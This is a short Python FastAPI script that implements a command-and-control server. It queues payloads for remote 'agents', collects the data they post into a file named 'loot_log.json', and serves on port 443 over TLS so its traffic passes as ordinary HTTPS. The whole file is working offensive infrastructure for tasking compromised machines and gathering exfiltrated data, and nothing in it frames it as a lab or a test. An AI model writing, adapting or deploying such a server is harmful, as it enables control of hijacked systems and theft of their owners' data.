
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
import uvicorn, os, json
from datetime import datetime

app = FastAPI()
TASK_QUEUE = {}
DATA_LOG = "loot_log.json"

@app.get("/task/{agent_id}")
def get_task(agent_id: str):
    task = TASK_QUEUE.pop(agent_id, None)
    if task:
        return {"payload": task}
    return {"payload": None}

@app.post("/data/{agent_id}")
async def post_data(agent_id: str, request: Request):
    data = await request.json()
    entry = {
        "agent_id": agent_id,
        "timestamp": datetime.utcnow().isoformat(),
        "data": data
    }
    log_entry(entry)
    return JSONResponse(content={"status": "ok"})

def log_entry(entry):
    if os.path.exists(DATA_LOG):
        with open(DATA_LOG, "r") as f:
            log = json.load(f)
    else:
        log = []
    log.append(entry)
    with open(DATA_LOG, "w") as f:
        json.dump(log, f, indent=2)

@app.post("/push/{agent_id}")
async def push_task(agent_id: str, request: Request):
    body = await request.json()
    TASK_QUEUE[agent_id] = body.get("payload")
    return {"status": "queued"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=443, ssl_keyfile="key.pem", ssl_certfile="cert.pem")
